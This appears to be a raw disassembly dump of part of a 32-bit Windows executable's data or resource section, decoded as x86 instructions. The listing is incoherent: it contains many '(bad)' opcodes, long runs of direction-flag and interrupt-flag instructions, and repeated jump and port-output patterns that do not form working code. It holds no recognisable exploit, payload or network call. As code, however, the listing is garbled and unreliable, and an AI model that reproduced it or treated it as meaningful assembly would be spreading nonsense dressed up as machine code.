  40c455:	dec    ebp
  40c456:	dec    ebp
  40c457:	dec    ebp
  40c458:	push   ebx
  40c45a:	add    BYTE PTR [eax],al
  40c45c:	(bad)  
  40c45d:	loope  0x40c45f
  40c45f:	add    BYTE PTR [ebx+0x1000063],al
  40c465:	add    eax,DWORD PTR [eax]
  40c467:	add    BYTE PTR [ecx],al
  40c469:	pop    es
  40c46a:	add    BYTE PTR [eax],al
  40c46c:	add    DWORD PTR [ecx],eax
  40c46e:	add    BYTE PTR [eax],al
  40c470:	add    DWORD PTR [ebx],0x0
  40c473:	add    bh,al
  40c475:	pop    es
  40c476:	add    BYTE PTR [eax],al
  40c478:	dec    DWORD PTR [edi]
  40c47a:	add    BYTE PTR [eax],al
  40c47c:	(bad)  
  40c47d:	pop    ds
  40c47e:	add    BYTE PTR [eax],al
  40c480:	add    DWORD PTR [ecx],0x0
  40c483:	add    BYTE PTR [ecx],al
  40c485:	add    DWORD PTR [eax],eax
  40c487:	add    BYTE PTR [ecx],al
  40c489:	add    DWORD PTR [eax],eax
  40c48b:	add    BYTE PTR [ecx],al
  40c48d:	add    DWORD PTR [eax],eax
  40c48f:	add    BYTE PTR [ebx-0x38ffffff],al
  40c495:	inc    DWORD PTR [eax]
  40c497:	add    BYTE PTR [eax],ch
  40c499:	add    BYTE PTR [eax],al
  40c49b:	add    BYTE PTR [eax],dh
  40c49d:	add    BYTE PTR [eax],al
  40c49f:	add    BYTE PTR [eax+0x0],ah
  40c4a2:	add    BYTE PTR [eax],al
  40c4a4:	add    DWORD PTR [eax],eax
  40c4a6:	and    BYTE PTR [eax],al
  40c4a8:	add    BYTE PTR [eax],al
  40c4aa:	add    BYTE PTR [eax],al
  40c4ac:	and    BYTE PTR ds:0x0,0x0
	...
  40c607:	add    BYTE PTR [edx-0x7cd1bd94],dl
  40c60d:	push   edi
  40c60e:	inc    DWORD PTR es:[ebx-0x7c00daa9]
  40c615:	push   edi
  40c616:	and    eax,0x255783ff
  40c61b:	inc    DWORD PTR [ebx+0xff2557]
  40c621:	add    BYTE PTR [eax],al
  40c623:	add    BYTE PTR [edi+edx*2+0x124],al
	...
  40c6c2:	add    BYTE PTR [eax],al
  40c6c4:	xchg   edx,eax
  40c6c5:	ins    BYTE PTR es:[edi],dx
  40c6c6:	inc    edx
  40c6c7:	test   BYTE PTR cs:[ecx+0x28],bl
  40c6cb:	inc    edi
  40c6cd:	mov    ds:0xa0c7ff82,al
  40c6d2:	cmp    edi,0xff809fc6
  40c6d8:	(bad)  
  40c6d9:	sahf   
  40c6da:	jg     0x40c6db
  40c6dc:	adc    DWORD PTR [edi+0x25],0xffffffff
	...
  40c784:	xchg   edx,eax
  40c785:	ins    BYTE PTR es:[edi],dx
  40c786:	inc    edx
  40c787:	jae    0x40c70e
  40c789:	pop    edx
  40c78a:	sub    bh,bh
  40c78c:	enter  0x84a3,0xff
  40c790:	enter  0x83a2,0xff
  40c794:	enter  0x82a2,0xff
  40c798:	(bad)  
  40c799:	mov    eax,ds:0x5783ff82
  40c79e:	and    eax,0xff
	...
  40c83f:	add    BYTE PTR [edx-0x78d1bd94],dl
  40c845:	pop    esp
  40c846:	sub    eax,0x7293b8ff
  40c84b:	dec    ecx
  40c84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c84e:	xchg   edi,edi
  40c850:	leave  
  40c851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c852:	xchg   bh,bh
  40c854:	enter  0x84a4,0xff
  40c858:	test   BYTE PTR [ecx+0x28],bl
  40c85b:	call   DWORD PTR [edx+0x73426c]
	...
  40c8fd:	add    BYTE PTR [eax],al
  40c8ff:	add    BYTE PTR [edx-0x778cbd94],dl
  40c905:	pop    esi
  40c906:	das    
  40c907:	dec    ebx
  40c909:	test   al,0x8c
  40c90b:	dec    ebx
  40c90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c90e:	mov    bh,bh
  40c910:	retf   0x88a6
  40c913:	dec    edx
  40c915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c916:	xchg   edi,edi
  40c918:	test   DWORD PTR [ebx+0x29],ebx
  40c91b:	call   DWORD PTR [edx+0x2e426c]
	...
  40c951:	add    BYTE PTR [eax],al
  40c953:	add    BYTE PTR [esi-0x72f5dba3],cl
  40c959:	pop    esp
  40c95a:	and    al,0x56
  40c95c:	mov    ebx,DWORD PTR [ebx+0x24]
  40c95f:	xchg   edi,eax
  40c960:	mov    bl,BYTE PTR [edx+0x24]
  40c963:	int    0x88
  40c965:	pop    ecx
  40c966:	and    al,0xf1
  40c968:	xchg   DWORD PTR [ecx+0x24],ebx
  40c96b:	icebp  
  40c96c:	xchg   BYTE PTR [eax+0x24],bl
  40c96f:	int    0x85
  40c971:	pop    eax
  40c972:	and    al,0x97
  40c974:	test   BYTE PTR [edi+0x24],dl
  40c977:	push   esi
  40c978:	test   BYTE PTR [edi+0x24],dl
  40c97b:	or     al,BYTE PTR [eax]
	...
  40c9b9:	add    BYTE PTR [eax],al
  40c9bb:	add    BYTE PTR [edx-0x75d1bd94],dl
  40c9c1:	pusha  
  40c9c2:	xor    bh,bh
  40c9c4:	mov    edx,0xcdff7697
  40c9c9:	stos   DWORD PTR es:[edi],eax
  40c9ca:	(bad)  
  40c9cb:	dec    esp
  40c9cd:	stos   BYTE PTR es:[edi],al
  40c9ce:	(bad)  
  40c9cf:	dec    esp
  40c9d1:	test   eax,0x5d87ff8c
  40c9d6:	sub    al,0xff
  40c9d8:	xchg   edx,eax
  40c9d9:	ins    BYTE PTR es:[edi],dx
  40c9da:	inc    edx
  40c9db:	jae    0x40c9dd
	...
  40ca0d:	add    BYTE PTR [eax],al
  40ca0f:	add    BYTE PTR [edx-0x6fbadba1],dl
  40ca15:	pop    esi
  40ca16:	and    al,0xab
  40ca18:	mov    ds,WORD PTR [esp-0x1]
  40ca1c:	lods   al,BYTE PTR ds:[esi]
  40ca1d:	mov    BYTE PTR [eax-0x1],ah
  40ca20:	retf   0x9cb5
  40ca23:	(bad)  
  40ca24:	in     eax,dx
  40ca25:	out    0xde,eax
  40ca27:	(bad)  
  40ca28:	out    dx,eax
  40ca29:	jmp    0xff9c:0xb4c9ffe3
  40ca30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca31:	xchg   BYTE PTR [eax-0x1],ah
  40ca34:	test   BYTE PTR [edi+0x24],dl
  40ca37:	inc    DWORD PTR [edi+edx*2+0x5784ab24]
  40ca3e:	and    al,0x45
	...
  40ca7c:	xchg   edx,eax
  40ca7d:	ins    BYTE PTR es:[edi],dx
  40ca7e:	inc    edx
  40ca7f:	jae    0x40ca0c
  40ca81:	bound  esi,QWORD PTR ds:0x94afcfff
  40ca87:	dec    edi
  40ca89:	lods   eax,DWORD PTR ds:[esi]
  40ca8a:	xchg   edx,eax
  40ca8b:	dec    ebp
  40ca8d:	lods   al,BYTE PTR ds:[esi]
  40ca8e:	xchg   ecx,eax
  40ca8f:	dec    ebp
  40ca91:	stos   DWORD PTR es:[edi],eax
  40ca92:	nop
  40ca93:	dec    DWORD PTR [eax-0x6d00d0a2]
  40ca99:	ins    BYTE PTR es:[edi],dx
  40ca9a:	inc    edx
  40ca9b:	add    BYTE PTR cs:[eax],al
	...
  40caca:	add    BYTE PTR [eax],al
  40cacc:	xchg   ebp,eax
  40cacd:	popa   
  40cace:	and    al,0x59
  40cad0:	xchg   ebx,eax
  40cad1:	pusha  
  40cad2:	and    al,0xd5
  40cad4:	xchg   ecx,eax
  40cad5:	pop    edi
  40cad6:	and    al,0xff
  40cad8:	aam    0xc6
  40cada:	mov    bl,0xff
  40cadc:	div    ch
  40cade:	repz (bad) 
  40cae0:	cld    
  40cae1:	cld    
  40cae2:	cld    
  40cae3:	(bad)  
  40cae4:	std    
  40cae5:	std    
  40cae6:	std    
  40cae7:	(bad)  
  40cae8:	std    
  40cae9:	std    
  40caea:	std    
  40caeb:	(bad)  
  40caec:	std    
  40caed:	std    
  40caee:	std    
  40caef:	(bad)  
  40caf0:	cli    
  40caf1:	clc    
  40caf2:	idiv   edi
  40caf4:	(bad)  
  40caf5:	enter  0xffb7,0x84
  40caf9:	push   edi
  40cafa:	and    al,0xff
  40cafc:	test   BYTE PTR [edi+0x24],dl
  40caff:	aad    0x84
  40cb01:	push   edi
  40cb02:	and    al,0x59
	...
  40cb18:	adc    BYTE PTR [esi+0x23],0xff
	...
  40cb38:	xchg   edx,eax
  40cb39:	ins    BYTE PTR es:[edi],dx
  40cb3a:	inc    edx
  40cb3b:	lea    esp,cs:[esi+0x39]
  40cb3f:	(bad)  
  40cb40:	mov    ebp,0xd1ff7c9c
  40cb45:	mov    cl,0x97
  40cb47:	dec    edi
  40cb49:	mov    al,0x95
  40cb4b:	dec    edi
  40cb4d:	scas   eax,DWORD PTR es:[edi]
  40cb4e:	xchg   esp,eax
  40cb4f:	dec    DWORD PTR [ecx-0x6d00cea0]
  40cb55:	ins    BYTE PTR es:[edi],dx
  40cb56:	inc    edx
  40cb57:	jae    0x40cb59
	...
  40cb85:	add    BYTE PTR [eax],al
  40cb87:	add    BYTE PTR [eax-0x68badb9d],bl
  40cb8d:	bound  esp,QWORD PTR [edx*8-0xdb9e6b]
  40cb94:	call   0xf540ae80
  40cb99:	div    dh
  40cb9b:	(bad)  
  40cb9c:	clc    
  40cb9d:	clc    
  40cb9e:	stc    
  40cb9f:	(bad)  
  40cba0:	sti    
  40cba1:	sti    
  40cba2:	sti    
  40cba3:	(bad)  
  40cba4:	std    
  40cba5:	std    
  40cba6:	std    
  40cba7:	(bad)  
  40cba8:	std    
  40cba9:	std    
  40cbaa:	std    
  40cbab:	(bad)  
  40cbac:	std    
  40cbad:	std    
  40cbae:	std    
  40cbaf:	(bad)  
  40cbb0:	std    
  40cbb1:	std    
  40cbb2:	std    
  40cbb3:	(bad)  
  40cbb4:	std    
  40cbb5:	std    
  40cbb6:	std    
  40cbb7:	push   esp
  40cbb9:	lock in eax,dx
  40cbbb:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  40cbc2:	and    al,0xd5
  40cbc4:	test   BYTE PTR [edi+0x24],dl
  40cbc7:	inc    ebp
	...
  40cbd8:	adc    BYTE PTR [edi+0x25],0xff
  40cbdc:	mov    BYTE PTR [ebx+0x29],bl
  40cbdf:	cli    
  40cbe0:	add    BYTE PTR [eax],al
  40cbe2:	add    BYTE PTR [eax],al
  40cbe4:	adc    DWORD PTR [eax+eiz*1+0x6],0x0
	...
  40cbf8:	xchg   edx,eax
  40cbf9:	ins    BYTE PTR es:[edi],dx
  40cbfa:	inc    edx
  40cbfb:	jae    0x40cb8b
  40cbfd:	addr16 cmp edi,edi
  40cc00:	shl    DWORD PTR [esi-0x4b2c0063],cl
  40cc06:	fwait
  40cc07:	call   edx
  40cc09:	mov    bl,0x99
  40cc0b:	call   ecx
  40cc0d:	mov    dl,0x98
  40cc0f:	dec    DWORD PTR [edx-0x6d00ca9e]
  40cc15:	ins    BYTE PTR es:[edi],dx
  40cc16:	inc    edx
  40cc17:	add    BYTE PTR cs:[eax],al
  40cc1a:	add    BYTE PTR [eax],al
  40cc1c:	jg     0x40cc70
  40cc1e:	push   ds
  40cc1f:	add    DWORD PTR [eax],eax
	...
  40cc41:	add    BYTE PTR [eax],al
  40cc43:	add    BYTE PTR [ebx-0x66f5db9b],bl
  40cc49:	fs and al,0xab
  40cc4c:	cwde   
  40cc4d:	arpl   WORD PTR [edi+edi*8],sp
  40cc50:	in     al,0xe1
  40cc52:	fdivp  st(7),st
  40cc54:	in     al,dx
  40cc55:	out    dx,al
  40cc56:	out    dx,eax
  40cc57:	push   eax
  40cc59:	repnz repnz push esp
  40cc5d:	cmc    
  40cc5e:	cmc    
  40cc5f:	push   edi
  40cc61:	clc    
  40cc62:	stc    
  40cc63:	(bad)  
  40cc64:	sti    
  40cc65:	sti    
  40cc66:	cld    
  40cc67:	(bad)  
  40cc68:	std    
  40cc69:	std    
  40cc6a:	std    
  40cc6b:	(bad)  
  40cc6c:	std    
  40cc6d:	std    
  40cc6e:	std    
  40cc6f:	(bad)  
  40cc70:	std    
  40cc71:	std    
  40cc72:	std    
  40cc73:	(bad)  
  40cc74:	std    
  40cc75:	std    
  40cc76:	std    
  40cc77:	(bad)  
  40cc78:	std    
  40cc79:	std    
  40cc7a:	std    
  40cc7b:	push   esp
  40cc7d:	lock in eax,dx
  40cc7f:	inc    DWORD PTR [ebp-0x7b00dba8]
  40cc85:	push   edi
  40cc86:	and    al,0xab
  40cc88:	test   BYTE PTR [edi+0x24],dl
  40cc8b:	or     al,BYTE PTR [eax]
	...
  40cc95:	add    BYTE PTR [eax],al
  40cc97:	add    BYTE PTR [ebx-0x2300daa9],al
  40cc9d:	les    esi,FWORD PTR [eax+0x3b6a92ff]
  40cca3:	jmp    0x5784:0x0
  40ccaa:	and    al,0x5
	...
  40ccb4:	xchg   edx,eax
  40ccb5:	ins    BYTE PTR es:[edi],dx
  40ccb6:	inc    edx
  40ccb7:	cs nop
  40ccb9:	push   0x3f
  40ccbb:	(bad)  
  40ccbc:	mov    edi,0xd5ff82a0
  40ccc1:	mov    eax,0xb7d4ffa0
  40ccc6:	lahf   
  40ccc7:	call   ebx
  40ccc9:	mov    dh,0x9e
  40cccb:	dec    DWORD PTR [ebp-0x6d00c79b]
  40ccd1:	ins    BYTE PTR es:[edi],dx
  40ccd2:	inc    edx
  40ccd3:	jae    0x40ccd5
	...
  40cd01:	add    BYTE PTR [eax],al
  40cd03:	add    BYTE PTR [ebp-0x64a9db9a],bl
  40cd09:	gs and al,0xff
  40cd0c:	into   
  40cd0d:	mov    edi,0xeae6ffab
  40cd12:	jmp    0xec2db616
  40cd17:	(bad)  
  40cd18:	in     al,dx
  40cd19:	out    dx,al
  40cd1a:	out    dx,eax
  40cd1b:	push   eax
  40cd1d:	repnz repnz push esp
  40cd21:	cmc    
  40cd22:	idiv   bh
  40cd24:	clc    
  40cd25:	stc    
  40cd26:	clc    
  40cd27:	(bad)  
  40cd28:	sti    
  40cd29:	sti    
  40cd2a:	sti    
  40cd2b:	(bad)  
  40cd2c:	std    
  40cd2d:	std    
  40cd2e:	std    
  40cd2f:	(bad)  
  40cd30:	std    
  40cd31:	std    
  40cd32:	std    
  40cd33:	(bad)  
  40cd34:	std    
  40cd35:	std    
  40cd36:	std    
  40cd37:	(bad)  
  40cd38:	std    
  40cd39:	std    
  40cd3a:	std    
  40cd3b:	(bad)  
  40cd3c:	std    
  40cd3d:	std    
  40cd3e:	std    
  40cd3f:	call   esi
  40cd41:	enter  0xffb7,0x85
  40cd45:	pop    eax
  40cd46:	and    al,0xff
  40cd48:	test   BYTE PTR [edi+0x24],dl
  40cd4b:	push   esi
	...
  40cd58:	adc    DWORD PTR [edi+0x26],0xffffffff
  40cd5c:	ffree  st(7)
  40cd5e:	mov    ah,0xff
  40cd60:	ffree  st(6)
  40cd62:	mov    bl,0xff
  40cd64:	adc    DWORD PTR [ebx+0x1e],0xe2
	...
  40cd73:	add    BYTE PTR [edx-0x6d8cbd94],dl
  40cd79:	ins    BYTE PTR es:[edi],dx
  40cd7a:	inc    edx
  40cd7b:	call   edi
  40cd7d:	mov    esp,0xbbd7ffa6
  40cd82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd83:	call   esi
  40cd85:	mov    edx,0xb8d5ffa3
  40cd8a:	mov    eax,ds:0x3b678eff
  40cd8f:	call   DWORD PTR [edx+0x2e426c]
	...
  40cdc1:	add    BYTE PTR [eax],al
  40cdc3:	add    BYTE PTR [esi-0x4768db9a],bl
  40cdc9:	xchg   edi,eax
  40cdca:	outs   dx,DWORD PTR ds:[esi]
  40cdcb:	jmp    edx
  40cdcd:	in     al,0xe2
  40cdcf:	jmp    ebx
  40cdd1:	out    0xe7,eax
  40cdd3:	jmp    ebp
  40cdd5:	jmp    0xec2acdc3
  40cdda:	jmp    0x40cddb
  40cddc:	in     al,dx
  40cddd:	out    dx,eax
  40cdde:	out    dx,eax
  40cddf:	push   eax
  40cde1:	repnz repnz push esp
  40cde5:	div    dh
  40cde7:	(bad)  
  40cde8:	clc    
  40cde9:	stc    
  40cdea:	stc    
  40cdeb:	(bad)  
  40cdec:	sti    
  40cded:	sti    
  40cdee:	sti    
  40cdef:	(bad)  
  40cdf0:	std    
  40cdf1:	std    
  40cdf2:	std    
  40cdf3:	(bad)  
  40cdf4:	std    
  40cdf5:	std    
  40cdf6:	std    
  40cdf7:	(bad)  
  40cdf8:	std    
  40cdf9:	std    
  40cdfa:	std    
  40cdfb:	(bad)  
  40cdfc:	std    
  40cdfd:	std    
  40cdfe:	std    
  40cdff:	(bad)  
  40ce00:	cli    
  40ce01:	clc    
  40ce02:	idiv   edi
  40ce04:	mov    ecx,0x85ff87a2
  40ce09:	push   edi
  40ce0a:	and    al,0x97
	...
  40ce18:	sbb    DWORD PTR [eax+0x29],0xffffffff
  40ce1c:	(bad)  
  40ce1e:	mov    eax,0xb7c8dfff
  40ce23:	(bad)  
  40ce24:	faddp  st(7),st
  40ce26:	mov    ch,0xff
  40ce28:	xchg   esp,eax
  40ce29:	imul   edi,DWORD PTR [ebx],0xe5
  40ce2f:	add    BYTE PTR [edx-0x6babbd94],dl
  40ce35:	outs   dx,DWORD PTR ds:[esi]
  40ce36:	inc    edi
  40ce37:	(bad)  
  40ce38:	mov    edi,0xd9ff82a0
  40ce3d:	mov    edi,0xbed8ffaa
  40ce42:	test   al,0xff
  40ce44:	xlat   BYTE PTR ds:[ebx]
  40ce45:	mov    ebp,0x6a90ffa6
  40ce4a:	aas    
  40ce4b:	call   DWORD PTR [edx+0x73426c]
	...
  40ce81:	add    BYTE PTR [eax],al
  40ce83:	add    BYTE PTR [edi-0x3632db98],bl
  40ce89:	mov    dh,0x9d
  40ce8b:	jmp    ebx
  40ce8d:	out    0xe7,eax
  40ce8f:	jmp    ebx
  40ce91:	out    0xe7,eax
  40ce93:	jmp    ebx
  40ce95:	out    0xe7,eax
  40ce97:	jmp    ebp
  40ce99:	call   0xed2ace87
  40ce9e:	jmp    0x40ce9f
  40cea0:	in     al,dx
  40cea1:	out    dx,al
  40cea2:	out    dx,eax
  40cea3:	push   eax
  40cea5:	repnz repnz push esp
  40cea9:	cmc    
  40ceaa:	idiv   bh
  40ceac:	clc    
  40cead:	clc    
  40ceae:	stc    
  40ceaf:	(bad)  
  40ceb0:	sti    
  40ceb1:	cld    
  40ceb2:	sti    
  40ceb3:	(bad)  
  40ceb4:	std    
  40ceb5:	std    
  40ceb6:	std    
  40ceb7:	(bad)  
  40ceb8:	std    
  40ceb9:	std    
  40ceba:	std    
  40cebb:	(bad)  
  40cebc:	std    
  40cebd:	std    
  40cebe:	std    
  40cebf:	(bad)  
  40cec0:	std    
  40cec1:	std    
  40cec2:	std    
  40cec3:	(bad)  
  40cec4:	fxch   st(7)
  40cec6:	(bad)  
  40cec7:	inc    DWORD PTR [esi+0xcd2458]
	...
  40ced5:	add    BYTE PTR [eax],al
  40ced7:	add    BYTE PTR [ebp-0x1e00d4a5],al
  40cedd:	int    0xbc
  40cedf:	jmp    eax
  40cee1:	int3   
  40cee2:	mov    ebx,0xb9cbdfff
  40cee7:	(bad)  
  40cee8:	(bad)  
  40ceea:	mov    bh,0xff
  40ceec:	mov    WORD PTR [ecx+0x30],fs
  40ceef:	aam    0x92
  40cef1:	ins    BYTE PTR es:[edi],dx
  40cef2:	inc    edx
  40cef3:	jae    0x40ce8b
  40cef5:	jb     0x40cf40
  40cef7:	(bad)  
  40cef8:	fadd   st(3),st
  40cefa:	mov    al,0xff
  40cefc:	fcmovnb st,st(3)
  40cefe:	scas   al,BYTE PTR es:[edi]
  40ceff:	(bad)  
  40cf00:	fcmovnb st,st(1)
  40cf02:	lods   al,BYTE PTR ds:[esi]
  40cf03:	(bad)  
  40cf04:	fld    st(0)
  40cf06:	stos   DWORD PTR es:[edi],eax
  40cf07:	call   DWORD PTR [ecx-0x6d00bd94]
  40cf0d:	ins    BYTE PTR es:[edi],dx
  40cf0e:	inc    edx
  40cf0f:	lea    esp,cs:[ecx+0x33]
  40cf13:	add    al,BYTE PTR [eax]
	...
  40cf41:	add    BYTE PTR [eax],al
  40cf43:	add    BYTE PTR [eax-0x250edb98],ah
  40cf49:	xlat   BYTE PTR ds:[ebx]
  40cf4a:	iret   
  40cf4b:	jmp    ebx
  40cf4d:	out    0xe7,eax
  40cf4f:	jmp    ebx
  40cf51:	out    0xe7,eax
  40cf53:	jmp    ebx
  40cf55:	out    0xe7,eax
  40cf57:	jmp    ebx
  40cf59:	out    0xe7,eax
  40cf5b:	jmp    ebp
  40cf5d:	jmp    0xec29cf4b
  40cf62:	in     al,dx
  40cf63:	(bad)  
  40cf64:	in     al,dx
  40cf65:	out    dx,al
  40cf66:	out    dx,al
  40cf67:	push   eax
  40cf69:	repnz repnz push esp
  40cf6d:	div    ch
  40cf6f:	push   edi
  40cf71:	clc    
  40cf72:	stc    
  40cf73:	(bad)  
  40cf74:	cli    
  40cf75:	sti    
  40cf76:	sti    
  40cf77:	(bad)  
  40cf78:	std    
  40cf79:	std    
  40cf7a:	std    
  40cf7b:	(bad)  
  40cf7c:	std    
  40cf7d:	std    
  40cf7e:	std    
  40cf7f:	(bad)  
  40cf80:	std    
  40cf81:	std    
  40cf82:	std    
  40cf83:	(bad)  
  40cf84:	jmp    0x40cf72
  40cf86:	jmp    0xf1:0x245987ff
	...
  40cf95:	add    BYTE PTR [eax],al
  40cf97:	add    BYTE PTR [esi-0x1c00d2a4],al
  40cf9d:	rol    cl,1
  40cf9f:	jmp    ebx
  40cfa1:	iret   
  40cfa2:	mov    edi,0xbdcde2ff
  40cfa7:	jmp    eax
  40cfa9:	int3   
  40cfaa:	mov    ebx,0xbacbe0ff
  40cfaf:	jmp    DWORD PTR [ebp-0x2600a781]
  40cfb5:	ret    
  40cfb6:	scas   al,BYTE PTR es:[edi]
  40cfb7:	(bad)  
  40cfb8:	ffree  st(7)
  40cfba:	mov    ah,0xff
  40cfbc:	ffree  st(5)
  40cfbe:	mov    dl,0xff
  40cfc0:	fadd   st(4),st
  40cfc2:	mov    cl,0xff
  40cfc4:	xchg   esp,eax
  40cfc5:	outs   dx,BYTE PTR ds:[esi]
  40cfc6:	inc    esi
  40cfc7:	call   DWORD PTR [edx+0x73426c]
	...
  40d001:	add    BYTE PTR [eax],al
  40d003:	add    BYTE PTR [ecx-0x260edb98],ah
  40d009:	aam    0xcb
  40d00b:	jmp    ebx
  40d00d:	out    0xe7,eax
  40d00f:	jmp    ebx
  40d011:	out    0xe7,eax
  40d013:	jmp    ebx
  40d015:	out    0xe7,eax
  40d017:	jmp    ebx
  40d019:	out    0xe7,eax
  40d01b:	jmp    ebx
  40d01d:	out    0xe7,eax
  40d01f:	jmp    ebp
  40d021:	jmp    0xed29d00f
  40d026:	jmp    0x40d027
  40d028:	in     al,dx
  40d029:	out    dx,al
  40d02a:	out    dx,eax
  40d02b:	push   eax
  40d02d:	repnz repnz push esp
  40d031:	div    ch
  40d033:	push   edi
  40d035:	clc    
  40d036:	clc    
  40d037:	(bad)  
  40d038:	sti    
  40d039:	cld    
  40d03a:	sti    
  40d03b:	(bad)  
  40d03c:	std    
  40d03d:	std    
  40d03e:	std    
  40d03f:	(bad)  
  40d040:	std    
  40d041:	std    
  40d042:	std    
  40d043:	(bad)  
  40d044:	call   0x8940b631
  40d049:	pop    ecx
  40d04a:	and    al,0xf1
	...
  40d058:	xchg   DWORD PTR [esi+0x2f],ebx
  40d05b:	jmp    ebp
  40d05d:	rol    ebp,cl
  40d05f:	jmp    esp
  40d061:	rol    bl,cl
  40d063:	jmp    esp
  40d065:	rol    cl,1
  40d067:	jmp    ebx
  40d069:	iret   
  40d06a:	sar    bh,0xe2
  40d06d:	into   
  40d06e:	mov    esi,0xbccde1ff
  40d073:	jmp    eax
  40d075:	int3   
  40d076:	mov    edx,0xb9cadfff
  40d07b:	(bad)  
  40d07c:	(bad)  
  40d07e:	mov    bh,0xff
  40d080:	fmulp  st(0),st
  40d082:	mov    ah,0xff
  40d084:	xchg   ebp,eax
  40d085:	jno    0x40d0d0
  40d087:	call   DWORD PTR [edx+0x2e426c]
	...
  40d0c1:	add    BYTE PTR [eax],al
  40d0c3:	add    BYTE PTR [edx-0x3632db97],ah
  40d0c9:	mov    bh,0x9d
  40d0cb:	jmp    ebx
  40d0cd:	out    0xe7,eax
  40d0cf:	jmp    ebx
  40d0d1:	out    0xe7,eax
  40d0d3:	jmp    ebx
  40d0d5:	out    0xe7,eax
  40d0d7:	jmp    ebx
  40d0d9:	out    0xe7,eax
  40d0db:	jmp    ebx
  40d0dd:	out    0xe7,eax
  40d0df:	jmp    ebx
  40d0e1:	out    0xe7,eax
  40d0e3:	jmp    ebp
  40d0e5:	jmp    0xec29d0d3
  40d0ea:	jmp    0x40d0eb
  40d0ec:	in     al,dx
  40d0ed:	out    dx,eax
  40d0ee:	out    dx,al
  40d0ef:	push   eax
  40d0f1:	repnz repnz push esp
  40d0f5:	cmc    
  40d0f6:	cmc    
  40d0f7:	push   edi
  40d0f9:	clc    
  40d0fa:	stc    
  40d0fb:	(bad)  
  40d0fc:	sti    
  40d0fd:	sti    
  40d0fe:	sti    
  40d0ff:	(bad)  
  40d100:	cld    
  40d101:	cld    
  40d102:	cld    
  40d103:	call   ecx
  40d105:	ret    0xffb0
  40d108:	mov    DWORD PTR [edx+0x24],ebx
  40d10b:	int    0x0
	...
  40d115:	add    BYTE PTR [eax],al
  40d117:	add    BYTE PTR [ecx-0x1800cea0],cl
  40d11d:	(bad)  
  40d11e:	leave  
  40d11f:	jmp    esi
  40d121:	aad    0xc8
  40d123:	jmp    esi
  40d125:	aam    0xc6
  40d127:	jmp    ebp
  40d129:	rol    ah,cl
  40d12b:	jmp    esp
  40d12d:	rol    edx,1
  40d12f:	jmp    ebx
  40d131:	rol    al,1
  40d133:	jmp    edx
  40d135:	into   
  40d136:	mov    esi,0xbdcde1ff
  40d13b:	jmp    eax
  40d13d:	int3   
  40d13e:	mov    ebx,0xb9cae0ff
  40d143:	call   FWORD PTR [esi-0x5a00ab86]
  40d149:	sbb    BYTE PTR [ecx-0x1],0xb2
  40d14d:	mov    DWORD PTR [ebx-0x1],esp
  40d150:	mov    al,0x85
  40d152:	pop    esi
  40d153:	jmp    FWORD PTR [ebp-0x5200a47d]
  40d159:	test   BYTE PTR [edi+edi*8-0x53],bl
  40d15d:	test   BYTE PTR [ebx-0x1],bl
  40d160:	lods   al,BYTE PTR ds:[esi]
  40d161:	sbb    DWORD PTR [eax-0x1],0xff33638f
  40d168:	adc    DWORD PTR [eax+eiz*1-0x6],0x0
	...
  40d184:	mov    ds:0xbb972469,al
  40d189:	call   0xffe1:0xe4e1ff6f
  40d190:	jecxz  0x40d179
  40d192:	out    0xff,eax
  40d194:	jecxz  0x40d17d
  40d196:	out    0xff,eax
  40d198:	jecxz  0x40d181
  40d19a:	out    0xff,eax
  40d19c:	jecxz  0x40d185
  40d19e:	out    0xff,eax
  40d1a0:	jecxz  0x40d189
  40d1a2:	out    0xff,eax
  40d1a4:	jecxz  0x40d18d
  40d1a6:	out    0xff,eax
  40d1a8:	out    0xe9,al
  40d1aa:	jmp    0xec2dbbae
  40d1af:	(bad)  
  40d1b0:	in     al,dx
  40d1b1:	out    dx,eax
  40d1b2:	out    dx,eax
  40d1b3:	push   eax
  40d1b5:	repnz repnz push esp
  40d1b9:	cmc    
  40d1ba:	idiv   bh
  40d1bc:	clc    
  40d1bd:	clc    
  40d1be:	stc    
  40d1bf:	push   esi
  40d1c1:	cmc    
  40d1c2:	hlt    
  40d1c3:	inc    esi
  40d1c5:	mov    cl,0x98
  40d1c7:	dec    DWORD PTR [edx+0x97245b]
	...
  40d1d5:	add    BYTE PTR [eax],al
  40d1d7:	add    BYTE PTR [ebx-0x1700ca9d],cl
  40d1dd:	fxch   st(6)
  40d1df:	(bad)  
  40d1e0:	call   0xe8409dbd
  40d1e5:	xlat   BYTE PTR ds:[ebx]
  40d1e6:	retf   0xe7ff
  40d1e9:	(bad)  
  40d1ea:	leave  
  40d1eb:	jmp    ebp
  40d1ed:	aad    0xc6
  40d1ef:	jmp    ebp
  40d1f1:	rol    ebp,cl
  40d1f3:	jmp    esp
  40d1f5:	rol    bl,cl
  40d1f7:	jmp    esp
  40d1f9:	rol    ecx,1
  40d1fb:	jmp    ebx
  40d1fd:	iret   
  40d1fe:	mov    edi,0xbecde2ff
  40d203:	jmp    eax
  40d205:	int3   
  40d206:	mov    esp,0xb9cbe0ff
  40d20b:	(bad)  
  40d20c:	(bad)  
  40d20e:	mov    eax,0xb6c9dfff
  40d213:	(bad)  
  40d214:	faddp  st(7),st
  40d216:	mov    ch,0xff
  40d218:	ffree  st(6)
  40d21a:	mov    dl,0xff
  40d21c:	fadd   st(4),st
  40d21e:	mov    cl,0xff
  40d220:	fcmovnb st,st(3)
  40d222:	scas   eax,DWORD PTR es:[edi]
  40d223:	call   DWORD PTR [ecx+0x7ede3565]
  40d229:	push   ecx
  40d22a:	sbb    al,0x55
	...
  40d244:	mov    ds:0xa2562469,al
  40d249:	imul   esp,DWORD PTR [edi+edi*8],0xffa9bece
  40d250:	jecxz  0x40d239
  40d252:	out    0xff,eax
  40d254:	jecxz  0x40d23d
  40d256:	out    0xff,eax
  40d258:	jecxz  0x40d241
  40d25a:	out    0xff,eax
  40d25c:	jecxz  0x40d245
  40d25e:	out    0xff,eax
  40d260:	jecxz  0x40d249
  40d262:	out    0xff,eax
  40d264:	jecxz  0x40d24d
  40d266:	out    0xff,eax
  40d268:	jecxz  0x40d251
  40d26a:	out    0xff,eax
  40d26c:	in     eax,0xe9
